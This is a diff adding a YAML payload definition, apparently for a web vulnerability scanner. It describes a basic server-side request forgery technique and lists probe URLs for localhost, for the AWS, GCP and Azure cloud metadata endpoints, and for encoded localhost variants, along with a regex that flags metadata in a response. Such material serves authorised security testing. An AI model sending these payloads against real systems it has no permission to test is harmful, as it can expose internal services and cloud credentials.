@@ -1,0 +1,25 @@
+techniques:
+  - id: ssrf_basic
+    name: "SSRF - Basic"
+    vuln_type: ssrf
+    description: "Server-side request forgery payloads"
+    severity: high
+    depth: standard
+    tags: ["ssrf"]
+    payloads:
+      - value: "http://127.0.0.1"
+        description: "Localhost access"
+      - value: "http://169.254.169.254/latest/meta-data/"
+        description: "AWS metadata endpoint"
+      - value: "http://metadata.google.internal/computeMetadata/v1/"
+        description: "GCP metadata endpoint"
+      - value: "http://169.254.169.254/metadata/v1/"
+        description: "Azure metadata endpoint"
+      - value: "http://[::1]"
+        description: "IPv6 localhost"
+      - value: "http://0x7f000001"
+        description: "Hex IP localhost"
+    detection:
+      - type: regex
+        value: "ami-|instance-id|project-id"
+        description: "Cloud metadata in response"
